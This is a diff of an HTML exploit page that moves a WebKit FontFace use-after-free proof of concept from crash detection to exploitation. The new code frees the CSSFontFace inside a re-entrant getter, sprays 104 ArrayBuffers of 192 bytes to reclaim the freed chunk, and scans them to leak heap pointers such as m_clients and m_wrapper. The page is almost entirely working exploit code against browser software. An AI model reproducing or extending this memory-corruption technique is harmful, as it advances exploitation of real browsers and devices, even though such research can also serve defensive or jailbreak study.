@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>P1</title>
+<title>P2</title>
 <style>body{font-size:28px;font-family:sans-serif;background:#111;color:#0f0}pre{white-space:pre-wrap;font-size:22px}</style>
 <style id="s0">@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }</style>
 </head>
@@ -10,39 +10,67 @@
 <h3 id="st">stage A</h3>
 <pre id="out"></pre>
 <script>
-// Phase 1 v4: verbatim port of WebKit's LayoutTests/fast/text/fontface-setstatus-crash.html
-// + on-screen instrumentation. Crash = FontFace UAF LIVE on this firmware.
+// Phase 2: reclaim + leak (port of 14.10 research FONTFACE_RECLAIM_LEAK design).
+// Inside the getter, after freeing the 192-byte CSSFontFace: spray 104 x
+// 192-byte ArrayBuffers with per-slot markers. The engine's post-free writes
+// (refcount+0x00, m_clients+0x58, m_wrapper+0x68, flag+0x85) land in whichever
+// buffer reclaimed the chunk -> marker oracle + pointer leak on screen.
 function log(s) {
   document.getElementById('out').textContent += s + "\n";
 }
+function hex(n, w) {
+  var h = n.toString(16);
+  while (h.length < (w || 16)) h = '0' + h;
+  return '0x' + h;
+}
 
-// Stage A: markers (unchanged)
-var markers = {
-  'URL.canParse': typeof URL !== 'undefined' && typeof URL.canParse === 'function',
-  'Promise.try': typeof Promise !== 'undefined' && typeof Promise.try === 'function',
-  'Array.fromAsync': typeof Array !== 'undefined' && typeof Array.fromAsync === 'function',
-  'RegExp.escape': typeof RegExp !== 'undefined' && typeof RegExp.escape === 'function',
-  'setMethods': typeof Set !== 'undefined' && typeof Set.prototype.union === 'function',
-  'iteratorHelpers': typeof Iterator !== 'undefined' && typeof Iterator.from === 'function',
-  'float16': typeof Float16Array !== 'undefined',
-  'cssRegisterProperty': typeof CSS !== 'undefined' && typeof CSS.registerProperty === 'function',
-  'structuredClone': typeof structuredClone === 'function'
-};
-var keys = Object.keys(markers);
-for (var i = 0; i < keys.length; i++) log(keys[i] + ' = ' + markers[keys[i]]);
 log('UA = ' + navigator.userAgent);
 
-// Stage B: the REAL regression-test trigger
+var NSPRAY = 104, SPRAYLEN = 192;
+var sprays = new Array(NSPRAY);
+
+function spray() {
+  for (var i = 0; i < NSPRAY; i++) {
+    var b = new ArrayBuffer(SPRAYLEN);
+    var u = new Uint8Array(b);
+    for (var j = 0; j < SPRAYLEN; j++)
+      u[j] = (i + j) & 0xff;            // per-slot marker pattern
+    sprays[i] = b;
+  }
+}
+
+function scan() {
+  var changes = [];
+  for (var i = 0; i < NSPRAY; i++) {
+    var u = new Uint8Array(sprays[i]);
+    var diff = 0;
+    for (var j = 0; j < SPRAYLEN; j++)
+      if (u[j] !== ((i + j) & 0xff)) diff++;
+    if (diff > 0) changes.push([i, diff]);
+  }
+  log('scan: ' + changes.length + ' buffer(s) changed');
+  for (var k = 0; k < changes.length && k < 4; k++) {
+    var i = changes[k][0];
+    log('slot ' + i + ': ' + changes[k][1] + ' bytes differ');
+    var dv = new DataView(sprays[i]);
+    log('  +0x00 u32 : ' + hex(dv.getUint32(0, true), 8) + '  (refcount?)');
+    log('  +0x58 u64 : ' + hex(dv.getBigUint64(0x58, true)) + '  (m_clients/HashTable ptr?)');
+    log('  +0x68 u64 : ' + hex(dv.getBigUint64(0x68, true)) + '  (m_wrapper/WeakPtrImpl ptr?)');
+    log('  +0x85 byte: ' + hex(dv.getUint8(0x85), 2) + '  (status flag?)');
+  }
+  if (changes.length === 0)
+    log('NO reclaim this run - reload the page to retry (per-boot variance)');
+  else
+    log('RECLAIM CONFIRMED - leaked pointers above');
+}
+
 function trigger() {
   log('stage B: trigger in 3s');
   setTimeout(function () {
-    log('triggering (real regression-test shape)');
+    log('triggering + spray');
 
-    // JS-created face with a LOCAL source so it resolves synchronously.
     var A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
     document.fonts.add(A);
-
-    // Register a DeferredPromise on A.
     void A.loaded;
 
     var fired = 0;
@@ -50,41 +78,34 @@ function trigger() {
       configurable: true,
       get: function () {
         fired++;
-        if (this === A && fired <= 3) {
-          log('GETTER FIRED #' + fired + ' - re-entrancy path ACTIVE');
-          if (fired === 1) {
-            // Allocate to help detect freed-memory reuse.
-            new FontFace('y', 'local(Helvetica Bold)', { unicodeRange: 'U+0041' });
-            new FontFace('z', 'local(Helvetica Italic)', { unicodeRange: 'U+0041' });
-            // Remove the CSS @font-face rule and force style recalc.
-            var sheet = document.getElementById('s0').sheet; var n0 = sheet ? sheet.cssRules.length : -1; log('rules before delete: ' + n0); try { sheet.deleteRule(0); log('deleteRule OK, rules now: ' + sheet.cssRules.length + ' - FACE FREED'); } catch (e) { log('deleteRule FAILED: ' + e); }
-            document.body.offsetTop;
-          }
+        if (this === A && fired === 1) {
+          log('GETTER FIRED - freeing + spraying');
+          try { document.getElementById('s0').sheet.deleteRule(0); } catch (e) {}
+          document.body.offsetTop;               // force recalc -> FREE
+          spray();                              // reclaim attempt, 104 x 192B
         }
         return undefined;
       }
     });
 
-    // Loading 'AB' needs both U+0041 (from A) and U+0042 (from the CSS rule).
     try {
       document.fonts.load('1em x', 'AB').then(
         function (faces) {
-          log('load resolved with ' + (faces ? faces.length : '?') +
-              ' faces, getter fired ' + fired + 'x - SURVIVED = likely patched');
+          log('load resolved with ' + (faces ? faces.length : '?') + ' faces');
+          setTimeout(scan, 500);
         },
-        function (e) { log('load rejected: ' + e + ' (getter fired ' + fired + 'x)'); }
+        function (e) { log('load rejected: ' + e); setTimeout(scan, 500); }
       );
-    } catch (e) {
-      log('load threw: ' + e);
-    }
+    } catch (e) { log('load threw: ' + e); }
 
-    setTimeout(function () { log('survived 8s - load promise settled? see resolve/reject lines above'); }, 8000);
+    // promise may hang (vulnerable signature) - scan anyway
+    setTimeout(scan, 2000);
+    setTimeout(scan, 5000);
   }, 3000);
 }
 
-log('stage A done');
+log('armed');
 window.onload = trigger;
 </script>
 </body>
 </html>
-
